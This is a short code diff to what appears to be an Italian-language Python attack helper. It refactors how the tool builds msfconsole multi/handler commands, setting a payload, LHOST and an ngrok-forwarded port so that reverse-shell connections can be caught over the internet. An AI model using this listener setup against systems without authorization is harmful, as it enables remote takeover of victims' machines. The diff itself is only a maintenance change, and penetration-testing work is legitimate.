@@ -330,6 +330,9 @@ def setPayload():
         os.system("clear")
         print(haxlopa)
         
+        if choice == "3":
+            payload = module
+        
         msf = input(f"\nAvviare {Fore.BLUE}msfconsole{Style.RESET_ALL}? Y/N: ")
         if msf.lower() == "y":
             if lanORwan.lower() == "y":
@@ -337,11 +340,6 @@ def setPayload():
             else: pass
             if lanORwan.lower() == "y":
                 command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {payload}; set LHOST {HOST}; set LPORT {ngrok_PORT}; exploit; exec bash\"'"
-            elif choice == "3":
-                if lanORwan.lower() == "y":
-                    command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {module}; set LHOST {HOST}; set LPORT {ngrok_PORT}; exploit; exec bash\"'"
-                else:
-                    command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {module}; set LHOST {HOST}; set LPORT {LPORT}; exploit; exec bash\"'"
             else:
                 command = f"gnome-terminal --geometry=80x24+1000+550 -- bash -c 'msfconsole -x \"use multi/handler; set payload {payload}; set LHOST {HOST}; set LPORT {LPORT}; exploit; exec bash\"'"  
           
